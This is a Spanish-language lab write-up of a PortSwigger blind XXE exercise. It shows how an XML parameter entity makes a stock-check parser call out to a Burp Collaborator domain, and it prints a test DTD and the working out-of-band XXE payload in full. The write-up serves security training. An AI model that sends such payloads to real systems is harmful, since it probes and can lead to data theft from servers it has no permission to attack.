---
title: XXE Injection Lab 4
date: 2024-11-27 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE Injection
  - Blind XXE with out-of-band interaction via XML parameter entities
image:
  path: /assets/img/XXE-Injection-Lab-4/Portswigger.png
---

## Skills

- Blind XXE with out-of-band interaction via XML parameter entities

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este laboratorio tiene una función de `Check stock` que analiza la entrada XML, pero `no muestra valores inesperados` y `bloquea` las `solicitudes` que contienen `entidades externas regulares`. Para resolver el laboratorio, debemos utilizar una `entidad` de `parámetro` para que el `analizador XML` realice una `búsqueda DNS` y una `solicitud HTTP` a `Burp Collaborator`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/XXE-Injection-Lab-4/image_1.png)

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![](/assets/img/XXE-Injection-Lab-4/image_2.png)

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![](/assets/img/XXE-Injection-Lab-4/image_3.png)

Vamos a insertar un `DTD (Document Type Definition)` y a `comprobar` si es `vulnerable` a `XXE`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe "Doe"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

La da un `error` al `enviar` la `petición`, esto se debe a que `no` podemos `llamar` a una `entidad` desde los campos existentes, en este caso la `entidad` declarada es `xxe`

![](/assets/img/XXE-Injection-Lab-4/image_4.png)

Nos vamos a `Burpsuite Collaborator` y pulsamos en `Copy to clipboard`, este dominio obtenido lo vamos a usar para construir este `payload`, el `%` sirve para `llamar` a la `entidad` desde el `DTD` creado

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y observamos que hemos `obtenido respuesta`

![](/assets/img/XXE-Injection-Lab-4/image_5.png)

